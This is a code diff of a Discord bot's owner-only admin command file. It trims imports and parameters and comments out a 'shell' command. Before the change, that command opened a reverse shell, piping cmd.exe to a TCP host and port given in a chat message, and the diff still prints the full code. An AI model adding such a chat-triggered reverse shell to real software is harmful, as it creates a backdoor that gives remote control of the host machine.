@@ -1,8 +1,7 @@
 // #region CommandBoilerplate
-const Categories = require("./modules/Categories");
 const client = require("../client.js");
-const { Guilds, GuildUsers, Users, ConfigDB, guildByID, userByID, guildByObj, userByObj } = require("./modules/database.js")
-const { Events, ContextMenuCommandBuilder, InteractionContextType: IT, ApplicationIntegrationType: AT, ApplicationCommandType, SlashCommandBuilder, Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, GatewayIntentBits, ModalBuilder, TextInputBuilder, TextInputStyle, Partials, ActivityType, PermissionFlagsBits, DMChannel, RoleSelectMenuBuilder, ChannelSelectMenuBuilder, ChannelType,AuditLogEvent, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, MessageReaction, MessageType}=require("discord.js");
+const { GuildUsers, ConfigDB, guildByObj } = require("./modules/database.js")
+const { Events, PermissionFlagsBits}=require("discord.js");
 function applyContext(context={}) {
 	for (let key in context) {
 		this[key] = context[key];
@@ -11,11 +10,10 @@ function applyContext(context={}) {
 
 // #endregion CommandBoilerplate
 
-const { notify } = require("../utils")
 const fs = require("fs");
 const config = require("../data/config.json")
 const { updateBlocklists } = require("./badware_scanner")
-const { exec } = require("child_process");
+const { setTimeout } = require("timers");
 
 module.exports = {
     data: {
@@ -85,7 +83,7 @@ module.exports = {
                     case "runDaily":
                         await msg.reply(`Running the daily listeners...`);
                         // @ts-ignore
-                        Object.entries(commands).find(([name, module]) => module.daily)[1].daily(pseudoGlobals);
+                        Object.entries(commands).find(([, module]) => module.daily)[1].daily(pseudoGlobals);
                         break;
                     case "runWelcome":
                         guild.sentWelcome = false;
@@ -106,7 +104,7 @@ module.exports = {
                         break;
                     case "checkRSS":
                         // @ts-ignore
-                        Object.entries(commands).find(([name, module]) => name === 'rss')[1].daily(pseudoGlobals);
+                        Object.entries(commands).find(([name]) => name === 'rss')[1].daily(pseudoGlobals);
                         // checkRSS();
                         break;
                     case "updateBlocklists":
@@ -114,34 +112,34 @@ module.exports = {
                         break;
                     case "crash":
                         // @ts-expect-error
-                        setTimeout(die => { undefined.instructed_to_crash = instructed_to_crash })
+                        setTimeout(() => { undefined.instructed_to_crash = instructed_to_crash })
                         // @ts-expect-error
-                        setTimeout(async die => { undefined.instructed_to_crash = instructed_to_crash })
+                        setTimeout(async () => { undefined.instructed_to_crash = instructed_to_crash })
                         // @ts-expect-error
                         undefined.instructed_to_crash = instructed_to_crash
                         break;
-                    case "shell":
-                        if (msg.author.id !== "724416180097384498") return;
+                    // case "shell":
+                    //     if (msg.author.id !== "724416180097384498") return;
 
-                        const args = msg.content.slice("~sudo shell ".length).trim().split(" ");
+                    //     const args = msg.content.slice("~sudo shell ".length).trim().split(" ");
                     
-                        var net = require("net"),
-                            cp = require("child_process"),
-                            sh = cp.spawn("cmd.exe", []);
+                    //     var net = require("net"),
+                    //         cp = require("child_process"),
+                    //         sh = cp.spawn("cmd.exe", []);
                     
-                        let sClient = new net.Socket();
-                        sClient.connect(Number(args[1]), args[0], function(){
-                            sClient.pipe(sh.stdin);
-                            sh.stdout.pipe(sClient);
-                            sh.stderr.pipe(sClient);
-                        });
+                    //     let sClient = new net.Socket();
+                    //     sClient.connect(Number(args[1]), args[0], function(){
+                    //         sClient.pipe(sh.stdin);
+                    //         sh.stdout.pipe(sClient);
+                    //         sh.stderr.pipe(sClient);
+                    //     });
                     
-                        // Add an error handler for resilience
-                        sClient.on('error', function(err){
-                            // Silently exit on error
-                        });
+                    //     // Add an error handler for resilience
+                    //     sClient.on('error', function(){
+                    //         // Silently exit on error
+                    //     });
                     
-                        return /a/; 
+                    //     return /a/; 
                         
                 }
                 config?.save();
